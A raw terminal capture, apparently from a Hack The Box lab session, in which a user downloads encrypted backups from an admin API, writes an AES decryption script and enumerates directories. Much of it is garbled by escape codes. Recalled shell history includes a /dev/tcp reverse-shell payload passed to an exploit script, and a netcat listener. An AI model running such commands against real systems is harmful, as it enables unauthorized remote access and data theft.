@@ -1,0 +1,629 @@
+ccclearcd   cd Downloadscd cd DDDoowwnnloadsloads[?1l>[?2004l
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hlllsls[?1l>[?2004l
+ 51902.py                   backup-20260404-205957.zip   full_results.nmap  'id_ed25519(1)'   kobold.xml           machines_us-6.ovpn      'passwd(1)'  'release_arena_us-release-2(1).ovpn'
+ 52347.py                  'exploit(1).py'               full_results.xml    kobold.gnmap     machines_sg-2.ovpn  'machines_us-7(1).ovpn'  'poc(1).py'   wingftp2
+'academy-regular(1).ovpn'   exploit.py                   hash.txt            kobold-htb.crt   machines_us-4.ovpn   machines_us-7.ovpn       poc.py       wingftp.key
+ academy-regular.ovpn       full_results.gnmap           id_ed25519          kobold.nmap      machines_us-5.ovpn   passwd                   pspy64
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hcccd Downloadscdcdcd cd           Downloadsc           ccd Downloads            uuunset HTTP_PROXYununz             ip /usr/share/wordlists/rockyou.txt.gzziipunzipp p b                                  bbaacckup-20260404-205957.zip  [?1l>[?2004l
+Archive:  backup-20260404-205957.zip
+  inflating: hash_info.txt           
+  inflating: nginx-ui.zip            
+  inflating: nginx.zip               
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004huuunzip backup-20260404-205957.zipununzziipunzipp p n                         nnggiinnxx--uuii.zip  [?1l>[?2004l
+Archive:  nginx-ui.zip
+  End-of-central-directory signature not found.  Either this file is not
+  a zipfile, or it constitutes one disk of a multi-part archive.  In the
+  latter case the central directory and zipfile comment will be found on
+  the last disk(s) of this archive.
+unzip:  cannot find zipfile directory in one of nginx-ui.zip or
+        nginx-ui.zip.zip, and cannot find nginx-ui.zip.ZIP, period.
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004huuunzip nginx-ui.zipununzziipunzipp p nnnb          nbin   nginx-ui.zipnggiinnxx-x       -ui.zipx.      .zziip  [?1l>[?2004l
+Archive:  nginx.zip
+  End-of-central-directory signature not found.  Either this file is not
+  a zipfile, or it constitutes one disk of a multi-part archive.  In the
+  latter case the central directory and zipfile comment will be found on
+  the last disk(s) of this archive.
+unzip:  cannot find zipfile directory in one of nginx.zip or
+        nginx.zip.zip, and cannot find nginx.zip.ZIP, period.
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hunzip nginx.zipunzip nginx.zip-ui.zip.zipbackup-20260404-205957.zip0404-205957.zipi pz  ip.   zip7    .zip5     7.zip9      57.zip5       957.zip0        5957.zip2         05957.zip-          205957.zip4           -205957.zip0            4-205957.zip4             04-205957.zip0              404-205957.zip6               0404-205957.zip2                60404-205957.zip0                 260404-205957.zip2                  0260404-205957.zip-                   20260404-205957.zipp                    -20260404-205957.zipbackup-20260404-2backup-20260404-2backup-20260404-2
+Completing zip file
+backup-20260404-205957.zip  backup-20260404-210101.zipMMunzip backup-20260404-205957.zipbackup-20260404-222        backup-20260404-221  backup-20260404-205957.zip21        10101.zip  [?1l>[?2004l
+Archive:  backup-20260404-210101.zip
+replace hash_info.txt? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
+  inflating: hash_info.txt           
+replace nginx-ui.zip? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
+  inflating: nginx-ui.zip            
+replace nginx.zip? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
+  inflating: nginx.zip               
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004huuunzip backup-20260404-210101.zipununzziipunzipp p n                         nginx.zipnggiinnxnginx
+Completing zip file
+nginx-ui.zip  nginx.zip   MMunzip nginx.zipnginxx..zziip[?1l>[?2004l
+Archive:  nginx.zip
+  End-of-central-directory signature not found.  Either this file is not
+  a zipfile, or it constitutes one disk of a multi-part archive.  In the
+  latter case the central directory and zipfile comment will be found on
+  the last disk(s) of this archive.
+unzip:  cannot find zipfile directory in one of nginx.zip or
+        nginx.zip.zip, and cannot find nginx.zip.ZIP, period.
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hcccd Downloadscu          rl http://wingdata.htbcurrlcurll l hhhthttp://a           dmin/ .sc napped.htb/bac   api/backup[?1l>[?2004l
+Warning: Binary output can mess up your terminal. Use "--output -" to tell curl to output it to your terminal anyway, or consider "--output <FILE>" to save to a file.
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hcurl http://admin.snapped.htb/api/backupcurl ---vv v v v ---O[?1l>[?2004l
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0   0     0   0     0     0     0  --:--:-- --:--:-- --:--:--     0* Host admin.snapped.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.129.18.211
+*   Trying 10.129.18.211:80...
+* Established connection to admin.snapped.htb (10.129.18.211 port 80) from 10.10.14.233 port 44086 
+* using HTTP/1.x
+> GET /api/backup HTTP/1.1
+> Host: admin.snapped.htb
+> User-Agent: curl/8.17.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: nginx/1.24.0 (Ubuntu)
+< Date: Sun, 05 Apr 2026 01:09:40 GMT
+< Content-Type: application/zip
+< Content-Length: 18354
+< Connection: keep-alive
+< Accept-Ranges: bytes
+< Cache-Control: must-revalidate
+< Content-Description: File Transfer
+< Content-Disposition: attachment; filename=backup-20260404-210940.zip
+< Content-Transfer-Encoding: binary
+< Expires: 0
+< Last-Modified: Sun, 05 Apr 2026 01:09:40 GMT
+< Pragma: public
+< Request-Id: f1462051-8107-4f62-954c-bc9dd3486ab4
+< X-Backup-Security: at3lvTAbtI+AeSYhRS1k+o6R4JsJJBg1JrovocBENXg=:AMBL5155VlP+wM636ejxpA==
+< 
+{ [8876 bytes data]
+100 18354 100 18354   0     0 102626     0  --:--:-- --:--:-- --:--:-- 103112
+* Connection #0 to host admin.snapped.htb:80 left intact
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hgggrep "rosesarered" /usr/share/wordlists/rockyou.txtgo                                                 buster dir -u http://154.57.164.64:32543 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txtgobbuusstteergobusterr r dir ---uu u hhhthttp://a                                                                                    dmin.snapped.htb ---ww w ///s/ /uussrr//sshhaarree//wwoorrddlists//usr/share/wordlists/
+Completing file
+dirb@           dnsmap.txt@     fern-wifi@      legion@         nmap.lst@       rockyou.txt.gz  sqlmap.txt@     wifite.txt@                                                             
+dirbuster@      fasttrack.txt@  john.lst@       metasploit@     rockyou.txt     seclists@       wfuzz@                                                                                MMMgobuster dir -u http://admin.snapped.htb -w /usr/share/wordlists//usr/share/wordlists//g/usr/share/wordlists/gob   /usr/share/wordlists//sseecclists//usr/share/wordlists/seclists/
+Completing file
+Discovery/         Fuzzing/           Miscellaneous/     Passwords/         Pattern-Matching/  Payloads/          README.md          Usernames/         Web-Shells/      MMgobuster dir -u http://admin.snapped.htb -w /usr/share/wordlists/seclists//usr/share/wordlists/seclists//DDiissccovery//usr/share/wordlists/seclists/Discovery/
+Completing file
+DNS/             File-System/     Infrastructure/  Mainframe/       SNMP/            Variables/       Web-Content/   MMgobuster dir -u http://admin.snapped.htb -w /usr/share/wordlists/seclists/Discovery//usr/share/wordlists/seclists/Discovery//WWeeb-Content//usr/share/wordlists/seclists/Discovery/Web-Content/
+Completing file
+ActiveDirectory-small.txt                               JavaServlets-Common.fuzz.txt                            raft-small-directories-lowercase.txt                  
+AdobeXML.fuzz.txt                                       LEGACY-SERVICES/                                        raft-small-directories.txt                            
+api/                                                    LinuxFileList.txt                                       raft-small-extensions-lowercase.txt                   
+big.txt                                                 Logins.fuzz.txt                                         raft-small-extensions.txt                             
+burp-parameter-names.txt                                mcp-server.txt                                          raft-small-files-lowercase.txt                        
+BurpSuite-ParamMiner/                                   Microsoft-Frontpage.txt                                 raft-small-files.txt                                  
+CMS/                                                    netware.txt                                             raft-small-words-lowercase.txt                        
+coldfusion.txt                                          ntlm-directories.txt                                    raft-small-words.txt                                  
+combined_directories.txt                                oauth-oidc-scopes.txt                                   README.md                                             
+combined_words.txt                                      Oracle9i.fuzz.txt                                       reverse-proxy-inconsistencies.txt                     
+common-api-endpoints-mazen160.txt                       OracleAppServer.fuzz.txt                                Roundcube-123.txt                                     
+Common-DB-Backups.txt                                   Passwords.fuzz.txt                                      rssfeed-files.txt                                     
+common_directories.txt                                  Programming-Language-Specific/                          sap-analytics-cloud.txt                               
+common.txt                                              Proxy-Auto-Configuration-Files.txt                      SAP-NetWeaver.txt                                     
+default-web-root-directory-linux.txt                    Public-Source-Repo-Issues.json                          Service-Specific/                                     
+default-web-root-directory-windows.txt                  quickhits.txt                                           SOAP-functions.txt                                    
+DirBuster-2007_directory-list-2.3-big.txt               raft-large-directories-lowercase.txt                    tftp.fuzz.txt                                         
+DirBuster-2007_directory-list-2.3-medium.txt            raft-large-directories.txt                              trickest-robots-disallowed-wordlists/                 
+DirBuster-2007_directory-list-2.3-small.txt             raft-large-extensions-lowercase.txt                     UnixDotfiles.fuzz.txt                                 
+DirBuster-2007_directory-list-lowercase-2.3-big.txt     raft-large-extensions.txt                               uri-from-top-55-most-popular-apps.txt                 
+DirBuster-2007_directory-list-lowercase-2.3-medium.txt  raft-large-files-lowercase.txt                          url-params_from-top-55-most-popular-apps.txt          
+DirBuster-2007_directory-list-lowercase-2.3-small.txt   raft-large-files.txt                                    URLs/                                                 
+domino-dirs-coldfusion39.txt                            raft-large-words-lowercase.txt                          versioning_metafiles.txt                              
+domino-endpoints-coldfusion39.txt                       raft-large-words.txt                                    vulnerability-scan_j2ee-websites_WEB-INF.txt          
+Domino-Hunter/                                          raft-medium-directories-lowercase.txt                   web-all-content-types.txt                             
+dsstorewordlist.txt                                     raft-medium-directories.txt                             web-extensions-big.txt                                
+dutch/                                                  raft-medium-extensions-lowercase.txt                    web-extensions.txt                                    
+File-Extensions-Universal-SVNDigger-Project/            raft-medium-extensions.txt                              web-mutations.txt                                     
+graphql.txt                                             raft-medium-files-lowercase.txt                         Web-Servers/                                          
+hashicorp-consul-api.txt                                raft-medium-files.txt                                   wso2-enterprise-integrator.txt                        
+hashicorp-vault.txt                                     raft-medium-words-lowercase.txt                                                                               
+JavaScript-Miners.txt                                   raft-medium-words.txt                                                                                         gobuster dir -u http://admin.snapped.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content//usr/share/wordlists/seclists/Discovery/Web-Content//ccoom/usr/share/wordlists/seclists/Discovery/Web-Content/com
+Completing file
+combined_directories.txt           common-api-endpoints-mazen160.txt  common_directories.txt                                                                               
+combined_words.txt                 Common-DB-Backups.txt              common.txt                                                                                           MMMgobuster dir -u http://admin.snapped.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/com/usr/share/wordlists/seclists/Discovery/Web-Content/commm
+M/usr/share/wordlists/seclists/Discovery/Web-Content/common/usr/share/wordlists/seclists/Discovery/Web-Content/commonn..txt  [?1l>[?2004l
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://admin.snapped.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+Progress: 0 / 1 (0.00%)
+2026/04/04 21:10:46 error on running gobuster on http://admin.snapped.htb/: connection refused
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hnnnc -lvnp 4444na           no wingftp.keynannonanoo o             wingftp.keyn             nano wingftp.keyna              no wingftp.keyn               nc -lvnp 4444             mmmv rockyou.txt /usr/share/wordlists/rockyou.txtmd                                             mdkmd m mv rockyou.txt /usr/share/wordlists/rockyou.txtmk                                             mkddiirmkdirr r bbbaacckkuuppsbackups[?1l>[?2004l
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hlllsls[?1l>[?2004l
+ 51902.py                   backup-20260404-205957.zip   full_results.gnmap   id_ed25519       kobold.xml          'machines_us-7(1).ovpn'  'passwd(1)'                            wingftp2
+ 52347.py                   backup-20260404-210101.zip   full_results.nmap   'id_ed25519(1)'   machines_sg-2.ovpn   machines_us-7.ovpn      'poc(1).py'                            wingftp.key
+'academy-regular(1).ovpn'   backups                      full_results.xml     kobold.gnmap     machines_us-4.ovpn   nginx-ui.zip             poc.py
+ academy-regular.ovpn      'exploit(1).py'               hash_info.txt        kobold-htb.crt   machines_us-5.ovpn   nginx.zip                pspy64
+ backup                     exploit.py                   hash.txt             kobold.nmap      machines_us-6.ovpn   passwd                  'release_arena_us-release-2(1).ovpn'
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hmmmkdir backupsmv           mv rockyou.txt /usr/share/wordlists/rockyou.txtmv mv b                                           bbab  rockyou.txt /usr/share/wordlists/rockyou.txtb                                           bbaacbackupbackupp--2backup-20260404-2backup-20260404-22110101.zip  b bab  i z . 1 0 1 0 1 2 - 4 0 4 0 6 2 0 2 - p u k c a b  rockyou.txt /usr/share/wordlists/rockyou.txt                                             rockyou.txt /usr/share/wordlists/rockyou.txtm                                              mmkdir backups             nnnc -lvnp 4444na           no wingftp.keynannonanoo o u           wingftp.keyu          nzip.   ip.py[?1l>[?2004l
+[?2004h(B)0[?1049h[?1h=[?1h=[?25l[ New File ]  GNU nano 8.6                                                                                       unzip.py                                                                                                ^G Help^O Write Out     ^F Where Is^K Cut^T Execute^C LocationM-U UndoM-A Set Mark     M-] To Bracket   M-B Previous     ◂ Back^◂ Prev Word^X Exit^R Read File     ^\ Replace^U Paste^J Justify^/ Go To Line    M-E RedoM-6 Copy^B Where Was     M-F Next▸ Forward^▸ Next Word[?25h[?25l*import base64from Crypto.Cipher import AESkey = base64.b64decode("cC6lyVvkbkxzG0X40e0a8A35nG2iP3BZVOnNf0QhSm0=")iv  = base64.b64decode("eyUwNE3ca0BXzDzFGr9Spg==")for filename in ["nginx-ui.zip", "nginx.zip"]:try:with open(filename, "rb") as f:ct = f.read()cipher = AES.new(key, AES.MODE_CBC, iv)pt = cipher.decrypt(ct)pad = pt[-1]pt = pt[:-pad]out = filename.replace(".zip", "_dec.zip")with open(out, "wb") as f:f.write(pt)print(f"Decrypted: {out}")except Exception as e:print(f"Failed {filename}: {e}")[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25hM[?25l[?25h[?25l[?25hM[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25hM[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25lSave modified buffer?                                                                                                                                                                                         Y Yes N No  ^C CancelMM[?25h[?25l[?25h[?25l^G HelpM-D DOS FormatM-A AppendM-B Backup File^T Browse^C Cancel         M-M Mac FormatM-P Prepend^Q Discard bufferMWrite to File: unzip.py[?25h[?25l [ Writing... ] [ Wrote 20 lines ][?25h[?1049l[?1l>[?2004l                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004h[?2004l
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hnano unzip.pynano unzip.pyls           mkdir backupsmkdir backupsls           nano unzip.pynano unzip.py             nano unzip.pynano unzip.py[?1l>[?2004l
+[?2004h(B)0[?1049h[?1h=[?1h=[?25l[ Reading... ][ Read 20 lines ]  GNU nano 8.6                                                                                       unzip.py                                                                                                ^G Help^O Write Out     ^F Where Is^K Cut^T Execute^C LocationM-U UndoM-A Set Mark     M-] To Bracket   M-B Previous     ◂ Back^◂ Prev Word^X Exit^R Read File     ^\ Replace^U Paste^J Justify^/ Go To Line    M-E RedoM-6 Copy^B Where Was     M-F Next▸ Forward^▸ Next Wordimport base64from Crypto.Cipher import AESkey = base64.b64decode("cC6lyVvkbkxzG0X40e0a8A35nG2iP3BZVOnNf0QhSm0=")iv  = base64.b64decode("eyUwNE3ca0BXzDzFGr9Spg==")for filename in ["nginx-ui.zip", "nginx.zip"]:try:with open(filename, "rb") as f:ct = f.read()cipher = AES.new(key, AES.MODE_CBC, iv)pt = cipher.decrypt(ct)pad = pt[-1]pt = pt[:-pad]out = filename.replace(".zip", "_dec.zip")with open(out, "wb") as f:f.write(pt)print(f"Decrypted: {out}")except Exception as e:print(f"Failed {filename}: {e}")[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25hM[?25l[?25hM[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25hM[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l*[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25lat3lvTAbtI+AeSYhRS1k+o6R4JsJJBg1JrovocBENXg=:AMBL5155VlP+wM636ejxpA==")[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25lat3lvTAbtI+AeSYhRS1k+o6R4JsJJBg1JrovocBENXg=:AMBL5155VlP+wM636ejxpA==")[?25h[?25l[?25h[?25l[?25hM[?25l[?25h[?25l[?25h[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h")[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25l[?25h[?25lSave modified buffer?                                                                                                                                                                                         Y Yes N No  ^C CancelMM[?25h[?25l^G HelpM-D DOS FormatM-A AppendM-B Backup File^T Browse^C Cancel         M-M Mac FormatM-P Prepend^Q Discard bufferMWrite to File: unzip.py[?25h[?25l [ Writing... ] [ Wrote 20 lines ][?25h[?1049l[?1l>[?2004l                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hpppython3 52347.py -u http://ftp.wingdata.htb -c "bash -c '/bin/bash -l > /dev/tcp/10.10.14.233/4444 0<&1 2>&1'"pypytthhoonpythonn33 3 u                                                                                                     uunnzziipp.py  [?1l>[?2004l
+Traceback (most recent call last):
+  File "/home/kali/Downloads/unzip.py", line 2, in <module>
+    from Crypto.Cipher import AES
+ModuleNotFoundError: No module named 'Crypto'
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hpppython3 unzip.pypi              ng cctv.htbpip          pipp33 3 iiininstall Crypto[?1l>[?2004l
+error: externally-managed-environment
+
+× This environment is externally managed
+╰─> To install Python packages system-wide, try apt install
+    python3-xyz, where xyz is the package you are trying to
+    install.
+    
+    If you wish to install a non-Kali-packaged Python package,
+    create a virtual environment using python3 -m venv path/to/venv.
+    Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make
+    sure you have pypy3-venv installed.
+    
+    If you wish to install a non-Kali-packaged Python application,
+    it may be easiest to use pipx install xyz, which will manage a
+    virtual environment for you. Make sure you have pipx installed.
+    
+    For more information, refer to the following:
+    * https://www.kali.org/docs/general-use/python3-external-packages/
+    * /usr/share/doc/python3.13/README.venv
+
+note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.
+hint: See PEP 668 for the detailed specification.
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004haaaws s3 ls s3://internal/.bundle/cache/compact_index/ --endpoint-url http://10.129.244.96:54321/ap                                                                                             t updateaptaptt t i     iininstall pppypython3 -crp ypto[?1l>[?2004l
+Error: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)
+Error: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), are you root?
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hsssudo nano /etc/hostssususudsuddosudoo o !              !!!!![?1l>[?2004l
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo apt install python3-crypto[?1h=[?2004hsudo apt[?1l>[?2004l
+[sudo] password for kali: 
+Reading package lists... 0%Reading package lists... 100%                              Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%                                Reading state information... 0%Reading state information... 0%                                Package python3-crypto is not available, but is referred to by another package.
+This may mean that the package is missing, has been obsoleted, or
+is only available from another source
+
+Error: Package 'python3-crypto' has no installation candidate
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hpppip3 install Cryptopipippipp33 3 iiininstall p     ppypycrupip3ypip3  yptodomw e -- -----bbrrar reeaakk--ssyysstteemm--ppaacckkaaggees[?1l>[?2004l
+Defaulting to user installation because normal site-packages is not writeable
+Collecting pycryptodome
+  Downloading pycryptodome-3.23.0-cp37-abi3-manylinux_2_17_aarch64.manylinux2014_aarch64.whl.metadata (3.4 kB)
+Downloading pycryptodome-3.23.0-cp37-abi3-manylinux_2_17_aarch64.manylinux2014_aarch64.whl (2.2 MB)
+[?25l   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 0.0/2.2 MB ? eta -:--:--   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸━━━━━━ 1.8/2.2 MB 13.1 MB/s eta 0:00:01   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.2/2.2 MB 11.7 MB/s  0:00:00
+[?25hInstalling collected packages: pycryptodome
+ERROR: pip's dependency resolver does not currently take into account all the packages that are installed. This behaviour is the source of the following dependency conflicts.
+netexec 1.4.0 requires aardwolf>=0.2.8, which is not installed.
+netexec 1.4.0 requires jwt>=1.3.1, which is not installed.
+Successfully installed pycryptodome-3.23.0
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hpip3 install pycryptodome --break-system-packagespip3--break-system-packagessudo apt install python3-crypto                  sudo aptryptoapt inst     apt instpip3 install Crypto       p3python3 unzip.py   hon3 unzip.py[?1l>[?2004l
+Decrypted: nginx-ui_dec.zip
+Decrypted: nginx_dec.zip
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hlllsls[?1l>[?2004l
+ 51902.py                   backup-20260404-205957.zip   full_results.gnmap   id_ed25519       kobold.xml          'machines_us-7(1).ovpn'   nginx.zip    pspy64
+ 52347.py                   backup-20260404-210101.zip   full_results.nmap   'id_ed25519(1)'   machines_sg-2.ovpn   machines_us-7.ovpn       passwd      'release_arena_us-release-2(1).ovpn'
+'academy-regular(1).ovpn'   backups                      full_results.xml     kobold.gnmap     machines_us-4.ovpn   nginx_dec.zip           'passwd(1)'   unzip.py
+ academy-regular.ovpn      'exploit(1).py'               hash_info.txt        kobold-htb.crt   machines_us-5.ovpn   nginx-ui_dec.zip        'poc(1).py'   wingftp2
+ backup                     exploit.py                   hash.txt             kobold.nmap      machines_us-6.ovpn   nginx-ui.zip             poc.py       wingftp.key
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004huuunzip nginx.zipununzziipunzipp p nnnc       nc nginx.zipngginginxnginxx-   ui.zipnginx-uinginx-uii_   _dec.zip  - --dd d bbbaacckkups/s [?1l>[?2004l
+Archive:  nginx-ui_dec.zip
+  End-of-central-directory signature not found.  Either this file is not
+  a zipfile, or it constitutes one disk of a multi-part archive.  In the
+  latter case the central directory and zipfile comment will be found on
+  the last disk(s) of this archive.
+unzip:  cannot find zipfile directory in one of nginx-ui_dec.zip or
+        nginx-ui_dec.zip.zip, and cannot find nginx-ui_dec.zip.ZIP, period.
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hlllslsl ls  unzip nginx-ui_dec.zip -d backupsunzip nginx-ui_dec.zip -d backups nginx-u_dec.zip  nginx_dec.zip[?1l>[?2004l
+Archive:  nginx_dec.zip
+  End-of-central-directory signature not found.  Either this file is not
+  a zipfile, or it constitutes one disk of a multi-part archive.  In the
+  latter case the central directory and zipfile comment will be found on
+  the last disk(s) of this archive.
+unzip:  cannot find zipfile directory in one of nginx_dec.zip or
+        nginx_dec.zip.zip, and cannot find nginx_dec.zip.ZIP, period.
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
+└─$ [?1h=[?2004hunzip nginx_dec.zip -d backups-ui_dec.zip -d backupsls                               lspython3 unzip.pypypip3 install pycryptodome --break-system-packagessudo apt install python3-crypto                  sudo aptapt inst     apt instpip3 install Crypto       python3 unzip.py   python3 unzip.pynano unzip.py   nano unzip.pyls           mkdir backupsmkdir backupsgobuster dir -u http://admin.snapped.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txtgobuster dir curl/api/backup -v -O                                                                 curl -v -Ocurlgobuster dir -u http://admin.snapped.htbw /usr/share/wordlists/seclists/Discovery/Web-Content/common.txtmkdir backups                                                                                             mkdir backupsls           lsnano unzip.pypython3 unzip.pypython3 unzip.pypip3 install Cryptopip3 install Cryaptpython3-cryptosudo apt install python3-cryptosudo aptpip3 install pycryptodome --break-system-packagespip3 inspython3 unzip.py                                 ls              lsunzip nginx-ui_dec.zip -d backupsun                                 lllsls[?1l>[?2004l
+ 51902.py                   backup-20260404-205957.zip   full_results.gnmap   id_ed25519       kobold.xml          'machines_us-7(1).ovpn'   nginx.zip    pspy64
+ 52347.py                   backup-20260404-210101.zip   full_results.nmap   'id_ed25519(1)'   machines_sg-2.ovpn   machines_us-7.ovpn       passwd      'release_arena_us-release-2(1).ovpn'
+'academy-regular(1).ovpn'   backups                      full_results.xml     kobold.gnmap     machines_us-4.ovpn   nginx_dec.zip           'passwd(1)'   unzip.py
+ academy-regular.ovpn      'exploit(1).py'               hash_info.txt        kobold-htb.crt   machines_us-5.ovpn   nginx-ui_dec.zip        'poc(1).py'   wingftp2
+ backup                     exploit.py                   hash.txt             kobold.nmap      machines_us-6.ovpn   nginx-ui.zip             poc.py       wingftp.key
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads]
